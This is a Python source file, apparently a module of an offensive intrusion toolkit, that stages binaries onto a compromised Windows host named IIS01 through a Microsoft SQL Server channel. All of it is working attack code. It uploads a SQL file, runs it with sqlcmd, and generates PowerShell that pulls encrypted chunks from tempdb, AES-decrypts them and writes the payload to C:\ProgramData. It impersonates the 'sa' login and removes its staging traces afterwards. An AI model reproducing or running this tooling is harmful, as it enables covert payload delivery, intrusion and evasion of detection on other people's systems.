import os


class StagingMixin:
    """Stage binaries to IIS01 via MSSQL DB channel."""

    def cmd_xpstage(self, shell, payload_name: str, encrypt: bool = True):
        """Stage a binary to IIS01 via MSSQL DB channel (no HTTP from IIS01)."""
        resp     = shell._post_json("/api/v1.0/mssql/stage", {
            "handler": "toneshell",
            "payload": payload_name,
            "encrypt": encrypt,
        })
        sql_file = resp["sqlFile"]
        key_b64  = resp.get("key", "")

        remote_sql = f"C:\\Windows\\Temp\\{sql_file}"
        shell.cmd_put_wait(sql_file, remote_sql)

        shell.cmd_exec_raw(f'{self._sqlcmd_prefix()} -i {remote_sql}')

        out_path = f"C:\\ProgramData\\{payload_name}"
        ps = self._build_decrypt_ps(key_b64, out_path) if (encrypt and key_b64) \
             else self._build_plain_ps(out_path)
        self.cmd_xpshell_psh(shell, ps)

        shell.cmd_exec_raw(f'cmd /c del /f {remote_sql}')
        self._exec_q(shell, "EXECUTE AS LOGIN='sa';IF OBJECT_ID('tempdb..stg','U') IS NOT NULL DROP TABLE tempdb..stg;")
        print(f"[+] xpstage done → {out_path}")

    def _build_decrypt_ps(self, key_b64: str, out_path: str) -> str:
        sqlclient_host = self._host.replace(':', ',')
        connstr = f'Server={sqlclient_host};Database=tempdb;User ID={self._login};Password={self._password};TrustServerCertificate=True'
        return (
            f"$kb=[System.Text.Encoding]::ASCII.GetBytes('{key_b64}');"
            "$kt=New-Object System.Security.Cryptography.FromBase64Transform;"
            "$kms=New-Object System.IO.MemoryStream;"
            "$kcs=New-Object System.Security.Cryptography.CryptoStream($kms,$kt,[System.Security.Cryptography.CryptoStreamMode]::Write);"
            "$kcs.Write($kb,0,$kb.Length);$kcs.FlushFinalBlock();$k=$kms.ToArray();"
            f"$cn=New-Object System.Data.SqlClient.SqlConnection('{connstr}');"
            "$cn.Open();$cm=$cn.CreateCommand();"
            "$cm.CommandText='SELECT chunk FROM tempdb..stg ORDER BY id';"
            "$rd=$cm.ExecuteReader();$sb=New-Object System.Text.StringBuilder;"
            "while($rd.Read()){$sb.Append($rd.GetString(0))|Out-Null};"
            "$rd.Close();$cn.Close();"
            "$raw=[System.Text.Encoding]::ASCII.GetBytes($sb.ToString());"
            "$t=New-Object System.Security.Cryptography.FromBase64Transform;"
            "$ms=New-Object System.IO.MemoryStream;"
            "$cs=New-Object System.Security.Cryptography.CryptoStream($ms,$t,[System.Security.Cryptography.CryptoStreamMode]::Write);"
            "$cs.Write($raw,0,$raw.Length);$cs.FlushFinalBlock();"
            "$b=$ms.ToArray();"
            "$a=[System.Security.Cryptography.Aes]::Create();"
            "$a.Mode='CBC';$a.Padding='PKCS7';$a.Key=$k;$a.IV=$b[0..15];"
            "$ct=$b[16..($b.Length-1)];"
            "$dec=$a.CreateDecryptor().TransformFinalBlock($ct,0,$ct.Length);"
            f"[IO.File]::WriteAllBytes('{out_path}',$dec)"
        )

    def _build_plain_ps(self, out_path: str) -> str:
        sqlclient_host = self._host.replace(':', ',')
        connstr = f'Server={sqlclient_host};Database=tempdb;User ID={self._login};Password={self._password};TrustServerCertificate=True'
        return (
            f"$cn=New-Object System.Data.SqlClient.SqlConnection('{connstr}');"
            "$cn.Open();$cm=$cn.CreateCommand();"
            "$cm.CommandText='SELECT chunk FROM tempdb..stg ORDER BY id';"
            "$rd=$cm.ExecuteReader();$sb=New-Object System.Text.StringBuilder;"
            "while($rd.Read()){$sb.Append($rd.GetString(0))|Out-Null};"
            "$rd.Close();$cn.Close();"
            "$raw=[System.Text.Encoding]::ASCII.GetBytes($sb.ToString());"
            "$t=New-Object System.Security.Cryptography.FromBase64Transform;"
            "$ms=New-Object System.IO.MemoryStream;"
            "$cs=New-Object System.Security.Cryptography.CryptoStream($ms,$t,[System.Security.Cryptography.CryptoStreamMode]::Write);"
            "$cs.Write($raw,0,$raw.Length);$cs.FlushFinalBlock();"
            "$b=$ms.ToArray();"
            f"[IO.File]::WriteAllBytes('{out_path}',$b)"
        )
